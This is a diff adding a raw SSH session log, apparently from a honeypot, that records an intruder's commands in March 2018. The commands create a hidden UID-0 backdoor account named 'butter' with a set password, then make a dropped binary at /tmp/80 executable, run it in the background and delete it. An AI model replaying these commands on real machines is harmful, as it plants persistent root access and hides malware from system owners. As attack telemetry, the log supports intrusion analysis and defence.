@@ -1,0 +1,32 @@
+180302-10:12:05 login login successful 
+180302-10:12:06 channel_request session 
+180302-10:12:06 exec_request success 
+180302-10:12:06 exec command uname -m 
+180302-10:12:07 channel_request session 
+180302-10:12:07 exec_request success 
+180302-10:12:07 exec command uname -r 
+180302-10:12:08 channel_request session 
+180302-10:12:09 exec_request success 
+180302-10:12:09 exec command useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter 
+180302-10:12:10 channel_request session 
+180302-10:12:10 exec_request success 
+180302-10:12:10 exec command echo "xuelp123"|passwd --stdin butter 
+180302-10:12:11 channel_request session 
+180302-10:12:11 exec_request success 
+180302-10:12:11 exec command echo butter:xuelp123|chpasswd 
+180302-10:12:12 channel_request session 
+180302-10:12:12 exec_request success 
+180302-10:12:12 exec command id -u 
+180302-10:12:14 channel_request session 
+180302-10:12:36 channel_request session 
+180302-10:12:37 exec_request success 
+180302-10:12:37 exec command chmod 755 /tmp/80 
+180302-10:12:38 channel_request session 
+180302-10:12:38 exec_request success 
+180302-10:12:38 exec command killall 80 
+180302-10:12:39 channel_request session 
+180302-10:12:39 exec_request success 
+180302-10:12:39 exec command /tmp/80 & 
+180302-10:12:45 channel_request session 
+180302-10:12:45 exec_request success 
+180302-10:12:45 exec command rm -f /tmp/80* 
